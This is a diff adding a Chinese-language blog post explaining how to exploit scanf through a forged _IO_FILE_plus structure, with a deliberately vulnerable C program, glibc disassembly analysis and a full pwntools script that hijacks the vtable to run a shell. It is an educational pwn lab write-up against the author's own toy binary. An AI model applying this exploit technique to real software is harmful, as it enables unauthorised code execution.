@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="之前写过IO_FILE的利用，只是在资料里看到scanf也能用，却没有做到对应的题目，也没有亲自调过，在xctf决赛时候的第一题，看见了sscanf以及bss上的溢出，以为可以用，但是sscanf是对字符串操作而不是IO，于是没有成功，但是还是好奇scanf应该怎么用。于是自己写了一个小程序，尝试修改bss上stdin的地址，并满足scanf中一系列的参数要求，最终完成利用。 漏洞程序123456">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="scanf的IO利用">
+<meta property="og:url" content="http://0gur1.cc/2018/11/12/scanf的IO利用/index.html">
+<meta property="og:site_name" content="0gur1">
+<meta property="og:description" content="之前写过IO_FILE的利用，只是在资料里看到scanf也能用，却没有做到对应的题目，也没有亲自调过，在xctf决赛时候的第一题，看见了sscanf以及bss上的溢出，以为可以用，但是sscanf是对字符串操作而不是IO，于是没有成功，但是还是好奇scanf应该怎么用。于是自己写了一个小程序，尝试修改bss上stdin的地址，并满足scanf中一系列的参数要求，最终完成利用。 漏洞程序123456">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://0gur1.cc/2018/11/12/scanf的IO利用/rdi.png">
+<meta property="og:image" content="http://0gur1.cc/2018/11/12/scanf的IO利用/r8.png">
+<meta property="og:image" content="http://0gur1.cc/2018/11/12/scanf的IO利用/95.png">
+<meta property="og:updated_time" content="2018-11-12T12:45:23.538Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="scanf的IO利用">
+<meta name="twitter:description" content="之前写过IO_FILE的利用，只是在资料里看到scanf也能用，却没有做到对应的题目，也没有亲自调过，在xctf决赛时候的第一题，看见了sscanf以及bss上的溢出，以为可以用，但是sscanf是对字符串操作而不是IO，于是没有成功，但是还是好奇scanf应该怎么用。于是自己写了一个小程序，尝试修改bss上stdin的地址，并满足scanf中一系列的参数要求，最终完成利用。 漏洞程序123456">
+<meta name="twitter:image" content="http://0gur1.cc/2018/11/12/scanf的IO利用/rdi.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+	  applicationID: '7MHLMVVD1M',
+      apiKey: 'dbb74cd528079f8c1d1a6138e9ed5b67',
+      indexName: 'test_hexo',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://0gur1.cc/2018/11/12/scanf的IO利用/"/>
+
+
+
+
+
+  <title>scanf的IO利用 | 0gur1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0gur1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  <!-- -->
+  
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/11/12/scanf的IO利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0gur1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0gur1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">scanf的IO利用</h1>
+        
+
+        <div class="post-meta">
+		  
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-12T17:37:20+08:00">
+                2018-11-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/12/scanf的IO利用/" class="leancloud_visitors" data-flag-title="scanf的IO利用">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,135字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>之前写过IO_FILE的利用，只是在资料里看到scanf也能用，却没有做到对应的题目，也没有亲自调过，在xctf决赛时候的第一题，看见了sscanf以及bss上的溢出，以为可以用，但是sscanf是对字符串操作而不是IO，于是没有成功，但是还是好奇scanf应该怎么用。于是自己写了一个小程序，尝试修改bss上stdin的地址，并满足scanf中一系列的参数要求，最终完成利用。</p>
+<h1 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">1024</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys</span><span class="params">()</span></span>&#123;</span><br><span class="line">	system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//使用了setvbuf才会在bss段里写入stdin，stdout和stderr的地址</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input idx:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%10d"</span>,&amp;i);</span><br><span class="line">    <span class="comment">//数组越界</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input num:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>,&amp;a[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input content:"</span>);</span><br><span class="line">    read(<span class="number">0</span>,b,<span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里最后一个scanf是为了触发漏洞，调用stdin的vtable。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>由于存在数组越界，覆写bss中的stdin地址，然后在b数组里伪造一个<code>_IO_FILE_plus</code>结构和一个<code>_IO_jump_t</code>结构，让stdin指向数组b即可。</p>
+<p>之前一直不理解，在IO时候究竟是怎么使用bss上的stdin的，看了libc中的汇编指令，<code>_isoc99_scanf</code>在调用_IO_vfscanf之前，参数存放在rdi中，而rdi的值是[r8]中的值。而r8是从stdin_ptr中读出的。</p>
+<p><img src="/2018/11/12/scanf的IO利用/rdi.png" alt="_isoc99_scanf调用_IO_vfscanf时的rdi"></p>
+<p><img src="/2018/11/12/scanf的IO利用/r8.png" alt="r8的值"></p>
+<p>而stdin_ptr位于libc的got表中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got:00000000003C3FB0 stdin_ptr       dq offset stdin         ; DATA XREF: scanf+8C↑r</span><br></pre></td></tr></table></figure>
+<p>通过动态调试，发现stdin_ptr中存放的值就是bss段上stdin的地址：</p>
+<p><img src="/2018/11/12/scanf的IO利用/95.png" alt="stdin_ptr内容"></p>
+<p>也就是说r8为bss中的地址，那么[r8]就对应着bss上这个地址中存放的内容。正常情况下，里面会写入libc中stdin的地址。但是，当把bss中stdin内容修改为数组b时，<code>_IO_vscanf</code>的参数就变成了数组b，即将数组b看作一个<code>_IO_FILE_plus</code>结构。</p>
+<p>伪造的<code>_IO_FILE_plus</code>结构需要满足一些条件：</p>
+<ol>
+<li><p><code>fp._lock</code>要填入一个地址，且<code>fp._lock</code>+8也是一个地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;__isoc99_scanf+117&gt;    mov    rdx, qword ptr [rbx + 0x88] //rbx+0x88对应着fp._lock</span><br><span class="line">&lt;__isoc99_scanf+124&gt;    mov    r9, qword ptr fs:[0x10]</span><br><span class="line">&lt;__isoc99_scanf+133&gt;    cmp    r9, qword ptr [rdx + 8]</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p><code>fp._lock</code>中地址对应的值为0，希望以eax和[rdx]相等的姿态完成这个操作。这里cmpxch指令的含义是，比较[rdx]和累加器eax中的值，若相等，将esi地址对应的值装载到[rdx]，zf置1；若不等，则将[rdx]的值加载到eax，zf置零。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;__isoc99_scanf+165&gt;    cmpxchg dword ptr [rdx], esi   &lt;0x6014a0&gt;//0x6014a0为数组a的地址</span><br><span class="line">&lt;__isoc99_scanf+168&gt;    je     __isoc99_scanf+192 &lt;0x7feb6538f590&gt;</span><br></pre></td></tr></table></figure>
+<p>——————————满足以上条件将进入到<code>_IO_vscanf</code>函数中—————————————</p>
+</li>
+<li><p><code>fp._flag</code>的最低字节的第3位不能为1，不走jne这条指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;_IO_vfscanf+164&gt;    test   al, 4</span><br><span class="line">&lt;_IO_vfscanf+166&gt;    jne    _IO_vfscanf+9928 &lt;0x7ffff7a6af48&gt;</span><br></pre></td></tr></table></figure>
+<p>——————————满足以上条件将进入到<code>__uflow</code>函数中——————————————</p>
+</li>
+<li><p><code>fp._flag</code>的值存放在rdx中，判断rdx的第二个字节（低）的第四位是否为1，期望值是不为1，不会执行下一条jne。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;__uflow+26&gt;    test   dh, 8</span><br><span class="line">&lt;__uflow+29&gt;    jne    __uflow+152 &lt;0x7feb6539f438&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>fp._markers</code>应该为0，否则就会进入到奇怪的分支中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;__uflow+49&gt;     cmp    qword ptr [rbx + 0x60], 0</span><br><span class="line">&lt;__uflow+54&gt;   ✔ je     __uflow+272 &lt;0x7feb6539f4b0&gt;</span><br></pre></td></tr></table></figure>
+<p>——————————满足以上条件将进入到fp.vtable.underflow处执行——————————</p>
+</li>
+<li><p>正常情况下是在underflow里面调用xgets，即vtable.xgets，但既然已经跳转到vtable中的underflow了，不如直接把underflow处对应的地址修改为system地址。</p>
+</li>
+<li>fp的<code>_IO_read_XXX</code>,<code>_IO_write_XXX</code>,<code>_IO_buf_XXX</code>之类的值都填成0比较安全，否则会进入到奇怪的分支中。</li>
+</ol>
+<p>最后构造的fp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_struct = <span class="string">'12;sh'</span>+<span class="string">'\x00'</span>*<span class="number">3</span><span class="comment">#_flag：0x733b3231 最低字节0x31的第三位为0；第二个字节0x32的第四位为0</span></span><br><span class="line">file_struct +=p64(<span class="number">0</span>)*<span class="number">11</span> <span class="comment">#11个IO指针</span></span><br><span class="line">file_struct +=p64(<span class="number">0</span>)*<span class="number">5</span> <span class="comment">#_lock之前，包含_markers</span></span><br><span class="line">file_struct +=p64(<span class="number">0x6014a0</span>) <span class="comment">#_lock：0x6014a0 _lock是一个地址（数组a)，且地址中的内容为0；_lock+8也是一个地址</span></span><br><span class="line">file_struct +=p64(<span class="number">0</span>)*<span class="number">9</span> <span class="comment">#vtable之前</span></span><br><span class="line">file_struct +=p64(b_addr+<span class="number">224</span>) <span class="comment">#vtable地址</span></span><br><span class="line">vtable = p64(<span class="number">0x40079f</span>)*<span class="number">9</span> <span class="comment">#vtable中内容</span></span><br></pre></td></tr></table></figure>
+<p>其中_flag既要满足限制条件，也要包含system要执行的参数，因此用”;”隔开，顺序执行指令。</p>
+<h1 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./fp_scanf'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"input idx:\n"</span>,<span class="string">'-134'</span>)</span><br><span class="line"></span><br><span class="line">b_addr = <span class="number">0x6010a0</span></span><br><span class="line">p.sendlineafter(<span class="string">"input num:\n"</span>,str(int(b_addr)))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">file_struct = <span class="string">'12;sh'</span>+<span class="string">'\x00'</span>*<span class="number">3</span></span><br><span class="line">file_struct +=p64(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">file_struct +=p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">file_struct +=p64(<span class="number">0x6014a0</span>)</span><br><span class="line">file_struct +=p64(<span class="number">0</span>)*<span class="number">9</span></span><br><span class="line">file_struct +=p64(b_addr+<span class="number">224</span>)</span><br><span class="line">vtable = p64(<span class="number">0x40079f</span>)*<span class="number">9</span></span><br><span class="line"></span><br><span class="line">payload = file_struct+vtable</span><br><span class="line">p.sendlineafter(<span class="string">"input content:\n"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/22/2018护网杯线上赛pwn/" rel="next" title="2018护网杯线上赛pwn">
+                <i class="fa fa-chevron-left"></i> 2018护网杯线上赛pwn
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.jpg"
+                alt="0gur1" />
+            
+              <p class="site-author-name" itemprop="name">0gur1</p>
+              <p class="site-description motion-element" itemprop="description">Stay hungry.Stay foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞程序"><span class="nav-number">1.</span> <span class="nav-text">漏洞程序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用脚本"><span class="nav-number">3.</span> <span class="nav-text">利用脚本</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0gur1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客量:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("KvkboNezCqOpWaIBvOMgJE3K-gzGzoHsz", "slQuYxW7tjbda9dyxmi3dY4o");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
